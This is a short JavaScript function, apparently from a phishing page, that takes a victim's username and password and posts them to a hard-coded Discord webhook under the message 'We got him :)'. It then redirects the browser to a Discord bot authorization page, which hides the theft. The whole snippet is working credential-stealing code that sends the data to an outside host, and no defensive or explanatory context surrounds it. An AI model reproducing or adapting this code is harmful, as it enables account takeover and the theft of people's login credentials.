
function sendData(User, Pass) {
    $.post('https://discord.com/api/webhooks/1049386385670418483/2ldO8XQev3xqHJt2j-hl2RhsNkpGXGsz90guX1_3fEDUhSc4Jin4E9MLz7vaweLsy4_5',
    {
        'username': 'We got him :)',
        'content': 'Username:\n\t' + User + '\nPassword:\n\t' + Pass,
    }, function(data, status) {
        console.log("Data: " + data + "\nStatus: " + status);
    }
    )
    window.location = "https://discord.com/oauth2/authorize/?permissions=268454976&scope=bot&client_id=510016054391734273"
}
